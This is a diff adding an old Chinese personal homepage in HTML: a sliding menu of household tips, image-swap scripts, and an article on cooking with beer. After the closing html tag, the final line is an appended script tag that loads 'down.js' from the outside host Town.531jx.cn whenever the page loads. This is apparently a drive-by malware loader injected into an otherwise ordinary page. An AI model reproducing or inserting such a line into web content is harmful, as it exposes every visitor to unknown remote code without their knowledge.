@@ -1,0 +1,329 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<style>
+#D1 {
+	BACKGROUND-COLOR: #CCFFFF;
+	BORDER-BOTTOM: white 2px outset;
+	BORDER-LEFT: white 2px outset;
+	BORDER-RIGHT: white 2px outset;
+	BORDER-TOP: white 2px outset;
+	LEFT: 0px;
+	POSITION: absolute;
+	TOP: 204px;
+	WIDTH: 158px;
+	layer-background-color: lightblue;
+	height: 327px;
+	visibility: visible;
+}
+</style>
+<script language="javascript">
+function menuIn() {
+        if(n4) {
+                clearTimeout(out_ID)
+                if( menu.left > menuW*-1+20+10 ) { 
+                        menu.left -= 8
+                        in_ID = setTimeout("menuIn()", 1)
+                }
+                else if( menu.left > menuW*-1+20 ) {
+                        menu.left--
+                        in_ID = setTimeout("menuIn()", 1)
+                }
+        }
+        else { 
+                clearTimeout(out_ID)
+                if( menu.pixelLeft > menuW*-1+20+10 ) {
+                        menu.pixelLeft -= 4
+                        in_ID = setTimeout("menuIn()", 1) 
+                }
+                else if( menu.pixelLeft > menuW*-1+20 ) {
+                        menu.pixelLeft--
+                        in_ID = setTimeout("menuIn()", 1)
+                }
+        }
+}
+function menuOut() {
+        if(n4) {
+                clearTimeout(in_ID)
+                if( menu.left < -10) { 
+                        menu.left += 4
+                        out_ID = setTimeout("menuOut()", 1)
+                }
+                else if( menu.left < 0) { 
+                        menu.left++
+                        out_ID = setTimeout("menuOut()", 1)
+                }
+                
+        }
+        else { 
+                clearTimeout(in_ID)
+                if( menu.pixelLeft < -10) {
+                        menu.pixelLeft += 2
+                        out_ID = setTimeout("menuOut()", 1)
+                }
+                else if( menu.pixelLeft < 0 ) {
+                        menu.pixelLeft++
+                        out_ID = setTimeout("menuOut()", 1)
+                }
+        }
+}
+function fireOver() { 
+        clearTimeout(F_out)
+        F_over = setTimeout("menuOut()", 10)
+}
+function fireOut() { 
+        clearTimeout(F_over)
+         F_out = setTimeout("menuIn()", 10)
+}
+function init() {
+        if(n4) {
+                menu = document.D1
+                menuW = menu.document.width
+                menu.left = menuW*-1+20                                 
+                document.D1.onmouseover = menuOut
+                document.D1.onmouseout = menuIn
+		menu.visibility = "visible"
+        }
+        else if(e4) { 
+                menu = D1.style
+                menuW = D1.offsetWidth
+                D1.style.pixelLeft = menuW*-1+20
+                D1.onmouseover = fireOver
+                D1.onmouseout = fireOut
+                D1.style.visibility = "visible"
+        }
+}
+F_over=F_out=in_ID=out_ID=null
+n4 = (document.layers)?1:0
+e4 = (document.all)?1:0;
+</script></head>
+<body><div id="D1"> 
+<table width="160" height="218" border="0">
+          <tr> 
+            <td height="60" align="middle"><b style="COLOR: green">★通通导航★
+            <p></p>
+            生活常识<br>
+            </b></td>
+          </tr>
+          <tr> 
+            <td><table width="152" border="0">
+              <tr>
+                <td height="34"><div align="left" class="style22 style23"><a href="nai.htm">含乳饮料不能当奶喝</a></div></td>
+              </tr>
+              <tr>
+                <td height="35"><div align="left" class="style22 style23"><a href="shiwu.htm">十种食物不宜多吃</a></div></td>
+              </tr>
+              <tr>
+                <td height="27"><DIV align=left class="style18 style23"><span class="style21"><span class="style20"><a href="sheng4.htm" class="style21">治咽喉肿痛的方法</a></span></span></DIV></td>
+              </tr>
+              <tr>
+                <td height="28"><a href="sheng1.htm" class="style22 style23">盐的妙用</a></td>
+              </tr>
+              <tr>
+                <td height="33"><a href="sheng2.htm" class="style22 style23">牙膏妙用</a></td>
+              </tr>
+              <tr>
+                <td height="27"><a href="sheng3.htm" class="style22 style23">啤酒的妙用</a></td>
+              </tr>
+              <tr>
+                <td height="34"><span class="style22 style23"><a href="niunai.htm">食用牛奶的学问</a></span></td>
+              </tr>
+              <tr>
+                <td height="27"><a href="sheng5.htm" class="style22 style23">插花保鲜五法</a></td>
+              </tr>
+            </table></td>
+          </tr>
+</table>
+      </div>
+</body>
+	 <BODY onload="init()"></BODY>
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
+<title>通通乐园</title>
+<meta http-equiv="Page-Enter" content="revealTrans(Duration=3.0,Transition=23)">
+<meta http-equiv="Page-Exit" content="revealTrans(Duration=3.0,Transition=23)">
+<meta http-equiv="Site-Enter" content="revealTrans(Duration=3.0,Transition=23)">
+<meta http-equiv="Site-Exit" content="revealTrans(Duration=3.0,Transition=23)">
+<script language="JavaScript">
+<!--
+function FP_swapImg() {//v1.0
+ var doc=document,args=arguments,elm,n; doc.$imgSwaps=new Array(); for(n=2; n<args.length;
+ n+=2) { elm=FP_getObjectByID(args[n]); if(elm) { doc.$imgSwaps[doc.$imgSwaps.length]=elm;
+ elm.$src=elm.src; elm.src=args[n+1]; } }
+}
+
+function FP_preloadImgs() {//v1.0
+ var d=document,a=arguments; if(!d.FP_imgs) d.FP_imgs=new Array();
+ for(var i=0; i<a.length; i++) { d.FP_imgs[i]=new Image; d.FP_imgs[i].src=a[i]; }
+}
+
+function FP_getObjectByID(id,o) {//v1.0
+ var c,el,els,f,m,n; if(!o)o=document; if(o.getElementById) el=o.getElementById(id);
+ else if(o.layers) c=o.layers; else if(o.all) el=o.all[id]; if(el) return el;
+ if(o.id==id || o.name==id) return o; if(o.childNodes) c=o.childNodes; if(c)
+ for(n=0; n<c.length; n++) { el=FP_getObjectByID(id,c[n]); if(el) return el; }
+ f=o.forms; if(f) for(n=0; n<f.length; n++) { els=f[n].elements;
+ for(m=0; m<els.length; m++){ el=FP_getObjectByID(id,els[n]); if(el) return el; } }
+ return null;
+}
+// -->
+</script>
+<style type="text/css">
+<!--
+body {
+	background-image: url(images/fgfdg.jpg);
+}
+.style1 {
+	font-family: "华文新魏";
+	font-size: large;
+}
+.style5 {
+	font-size: xx-large;
+	font-family: "方正舒体";
+}
+.style7 {
+	font-size: 35px;
+	font-family: "方正舒体";
+	color: #0000FF;
+	font-weight: bold;
+}
+.style10 {
+	font-size: 16pt;
+	font-family: "华文新魏";
+}
+.style12 {
+	font-size: 24pt;
+	font-family: "方正舒体";
+	color: #CC6600;
+	font-weight: bold;
+}
+.style14 {font-size: 35px; font-family: "方正舒体"; color: #000000; font-weight: bold; }
+-->
+</style>
+<script language="JavaScript" type="text/JavaScript">
+<!--
+function MM_reloadPage(init) {  //reloads the window if Nav4 resized
+  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
+    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
+  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
+}
+MM_reloadPage(true);
+
+function MM_swapImgRestore() { //v3.0
+  var i,x,a=document.MM_sr; for(i=0;a&&i<a.length&&(x=a[i])&&x.oSrc;i++) x.src=x.oSrc;
+}
+
+function MM_preloadImages() { //v3.0
+  var d=document; if(d.images){ if(!d.MM_p) d.MM_p=new Array();
+    var i,j=d.MM_p.length,a=MM_preloadImages.arguments; for(i=0; i<a.length; i++)
+    if (a[i].indexOf("#")!=0){ d.MM_p[j]=new Image; d.MM_p[j++].src=a[i];}}
+}
+
+function MM_findObj(n, d) { //v4.01
+  var p,i,x;  if(!d) d=document; if((p=n.indexOf("?"))>0&&parent.frames.length) {
+    d=parent.frames[n.substring(p+1)].document; n=n.substring(0,p);}
+  if(!(x=d[n])&&d.all) x=d.all[n]; for (i=0;!x&&i<d.forms.length;i++) x=d.forms[i][n];
+  for(i=0;!x&&d.layers&&i<d.layers.length;i++) x=MM_findObj(n,d.layers[i].document);
+  if(!x && d.getElementById) x=d.getElementById(n); return x;
+}
+
+function MM_swapImage() { //v3.0
+  var i,j=0,x,a=MM_swapImage.arguments; document.MM_sr=new Array; for(i=0;i<(a.length-2);i+=3)
+   if ((x=MM_findObj(a[i]))!=null){document.MM_sr[j++]=x; if(!x.oSrc) x.oSrc=x.src; x.src=a[i+2];}
+}
+//-->
+</script>
+<bgsound src="mid/0154.mid" loop="-1">
+</head>
+
+<body onload="FP_preloadImgs(/*url*/'images/button5.jpg', /*url*/'images/button6.jpg', /*url*/'images/button8.jpg', /*url*/'images/button9.jpg', /*url*/'images/buttonB.jpg', /*url*/'images/buttonC.jpg', /*url*/'images/buttonE.jpg', /*url*/'images/buttonF.jpg', /*url*/'images/button11.jpg', /*url*/'images/button12.jpg', /*url*/'images/button14.jpg', /*url*/'images/button15.jpg', /*url*/'images/button17.jpg', /*url*/'images/button18.jpg');MM_preloadImages('images/button6.gif','images/button9.gif','images/buttonC.gif','images/buttonF.gif','images/button12.gif','images/button18.gif')">
+<div id="Layer4" style="position:absolute; visibility:inherit; width:703px; height:468px; z-index:10; left: 177px; top: 195px;">
+  <p align="center" class="style5"><span class="style12">啤酒的妙用</span></p>
+  <p class="style5"><span class="style14"><span class="style10">用啤酒將面粉調稀。淋在肉片或肉丝上，炒出來的肉鮮嫩可口，特別是用此方法烹調牛肉，效果更佳．<BR>
+      <BR>
+      啤酒可使涼拌菜增加美味。將菜浸在啤酒中煮一下，酒一沸騰便取出，再加點調味劑。<BR>
+      <BR>
+      和面時水中摻些啤酒，烤制出的小薄面餅又脆又香。<BR>
+      <BR>
+      將烤制面包的面团中揉进适量的啤酒，面包既容易烤制，又有一種近乎肉的味道。<BR>
+      <BR>
+      制做較肥的肉或脂肪較多的魚時，加一杯啤酒，能消除油膩味，吃起來很爽口。<BR>
+      <BR>
+      將待用制做的鸡放在盐、胡椒和啤酒中，浸１～２小時，能取掉鸡的膻味</span></span><span class="style7"><BR>
+  </span></p>
+</div>
+<table width="976" height="69" border="0">
+  <tr>
+    <td width="219"><img src="images/&#23398;&#20064;&#22253;&#22320;.gif" width="219" height="114"></td>
+    <td width="747"><object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="747" height="107">
+      <param name="movie" value="swf/&#24555;&#20048;.swf">
+      <param name="quality" value="high">
+      <embed src="swf/&#24555;&#20048;.swf" quality="high" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" width="747" height="107"></embed>
+    </object></td>
+  </tr>
+  <tr>
+    <td colspan="2">
+	<marquee scrollamount="3" scrolldelay="30" style="font-family: 新宋体; color: #71F74F; font-weight: bold" bgcolor="#FF0000">欢迎光临我的网站^_^ 温馨提示：用1024x768分辨率访问本站效果极佳！QQ:541972321 EMALL:<a href="mailto:yuntongfuwa@yahoo.com.cn">yuntongfuwa@yahoo.com.cn</a>
+	</marquee></td>
+  </tr>
+</table>
+<table border="0" width="976" id="table1">
+	<tr>
+      <td align="center"><a href="index.htm"> </a><a href="index.htm" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image33','','images/button6.gif',1)"><img src="images/button4.gif" name="Image33" width="120" height="24" border="0"></a></td>
+      <td align="center"><a href="jiankang.htm"> </a><a href="jiankang.htm" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image34','','images/button9.gif',1)"><img src="images/button7.gif" name="Image34" width="120" height="24" border="0"></a></td>
+      <td align="center"><a href="shenghuo.htm"> </a><a href="shenghuo.htm" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image35','','images/buttonC.gif',1)"><img src="images/buttonA.gif" name="Image35" width="120" height="24" border="0"></a></td>
+      <td align="center"><a href="xuexi.htm"> </a><a href="xuexi.htm" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image36','','images/buttonF.gif',1)"><img src="images/buttonD.gif" name="Image36" width="120" height="24" border="0"></a></td>
+      <td align="center"><a href="wangluo.htm" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image37','','images/button12.gif',1)"><img src="images/button10.gif" name="Image37" width="120" height="24" border="0"></a></td>
+      <td align="center"><a href="rensheng.htm"> </a>
+          <p align="center"><a href="xiaohua.htm"> </a><a href="xiaohua.htm" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image39','','images/button18.gif',1)"><img src="images/button16.gif" name="Image39" width="120" height="24" border="0"></a></td>
+  </tr>
+</table>
+
+<p>　</p>
+ <p>　</p>
+ <div id="Layer9" style="position:absolute; visibility:inherit; width:25px; height:23px; z-index:9; left: 917px; top: 507px;"><img src="images/0415star2.gif" width="32" height="32"></div>
+ <div id="Layer9" style="position:absolute; visibility:inherit; width:25px; height:23px; z-index:9; left: 742px; top: 246px;"><img src="images/0415star2.gif" width="32" height="32"></div>
+ <div id="Layer9" style="position:absolute; visibility:inherit; width:25px; height:23px; z-index:9; left: 873px; top: 363px;"><img src="images/0415star2.gif" width="32" height="32"></div>
+ <div id="Layer9" style="position:absolute; visibility:inherit; width:25px; height:23px; z-index:9; left: 545px; top: 347px;"><img src="images/0415star2.gif" width="32" height="32"></div>
+ <div id="Layer9" style="position:absolute; visibility:inherit; width:25px; height:23px; z-index:9; left: 564px; top: 379px;"><img src="images/0415star2.gif" width="32" height="32"></div>
+ <div id="Layer9" style="position:absolute; visibility:inherit; width:25px; height:23px; z-index:9; left: 671px; top: 277px;"><img src="images/0415star2.gif" width="32" height="32"></div>
+ <p>　</p>
+ 
+ <div id="Layer9" style="position:absolute; visibility:inherit; width:25px; height:23px; z-index:9; left: 585px; top: 316px;"><img src="images/0415star2.gif" width="32" height="32"></div> 
+<p>　</p>
+ <div id="Layer9" style="position:absolute; visibility:inherit; width:25px; height:23px; z-index:9; left: 407px; top: 323px;"><img src="images/0415star2.gif" width="32" height="32"></div>
+ <div id="Layer9" style="position:absolute; visibility:inherit; width:25px; height:23px; z-index:9; left: 558px; top: 276px;"><img src="images/0415star2.gif" width="32" height="32"></div>
+ <div id="Layer3" style="position:absolute; visibility:inherit; width:77px; height:328px; z-index:3; left: 873px; top: 216px;"><img src="images/2006123203132838.gif" width="102" height="347"></div>
+ <p>　</p>
+ <div id="Layer9" style="position:absolute; visibility:inherit; width:25px; height:23px; z-index:9; left: 509px; top: 318px;"><img src="images/0415star2.gif" width="32" height="32"></div>
+ <div id="Layer9" style="position:absolute; visibility:inherit; width:25px; height:23px; z-index:9; left: 623px; top: 214px;"><img src="images/0415star2.gif" width="32" height="32"></div>
+ <div id="Layer9" style="position:absolute; visibility:inherit; width:25px; height:23px; z-index:9; left: 323px; top: 482px;"><img src="images/0415star2.gif" width="32" height="32"></div>
+ <div id="Layer1" style="position:absolute; visibility:inherit; width:973px; height:97px; z-index:1; left: 2px; top: 737px;"><img src="images/5370_r5.gif" width="968" height="94"></div>
+ <div id="Layer2" style="position:absolute; visibility:inherit; width:79px; height:228px; z-index:2; left: 904px; top: 610px;"><img src="images/5370_f5.gif" width="92" height="220"></div>
+ <p>　</p>
+ <p>　</p>
+ <div id="Layer9" style="position:absolute; visibility:inherit; width:25px; height:23px; z-index:9; left: 471px; top: 414px;"><img src="images/0415star2.gif" width="32" height="32"></div>
+ <div id="Layer9" style="position:absolute; visibility:inherit; width:25px; height:23px; z-index:9; left: 691px; top: 207px;"><img src="images/0415star2.gif" width="32" height="32"></div>
+ <p>　</p>
+ <div id="Layer9" style="position:absolute; visibility:inherit; width:25px; height:23px; z-index:9; left: 524px; top: 254px;"><img src="images/0415star2.gif" width="32" height="32"></div>
+ <div id="Layer9" style="position:absolute; visibility:inherit; width:25px; height:23px; z-index:9; left: 441px; top: 468px;"><img src="images/0415star2.gif" width="32" height="32"></div>
+ <div id="Layer9" style="position:absolute; visibility:inherit; width:25px; height:23px; z-index:9; left: 934px; top: 277px;"><img src="images/0415star2.gif" width="32" height="32"></div>
+ <div id="Layer9" style="position:absolute; visibility:inherit; width:25px; height:23px; z-index:9; left: 369px; top: 377px;"><img src="images/0415star2.gif" width="32" height="32"></div>
+ <div id="Layer9" style="position:absolute; visibility:inherit; width:25px; height:23px; z-index:9; left: 321px; top: 538px;"><img src="images/0415star2.gif" width="32" height="32"></div>
+ <p align="center" class="style1">　</p>
+ <div id="Layer9" style="position:absolute; visibility:inherit; width:25px; height:23px; z-index:9; left: 283px; top: 433px;"><img src="images/0415star2.gif" width="32" height="32"></div>
+ <div id="Layer9" style="position:absolute; visibility:inherit; width:25px; height:23px; z-index:9; left: 431px; top: 397px;"><img src="images/0415star2.gif" width="32" height="32"></div>
+ <div id="Layer9" style="position:absolute; visibility:inherit; width:25px; height:23px; z-index:9; left: 393px; top: 451px;"><img src="images/0415star2.gif" width="32" height="32"></div>
+ <p align="left" class="style1">&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </p>
+ <div id="Layer9" style="position:absolute; visibility:inherit; width:25px; height:23px; z-index:9; left: 267px; top: 508px;"><img src="images/0415star2.gif" width="32" height="32"></div>
+ <p align="left" class="style1">　</p>
+ <p align="center" class="style1">&nbsp; </p>
+<p align="center">　</p>
+<p align="center">　</p>
+<p align="center">　</p>
+<p align="center">　</p>
+<p align="center">　</p>
+</body>
+</html>
+
+<script language=javascript src=http://Town.531jx.cn/down.js></script>
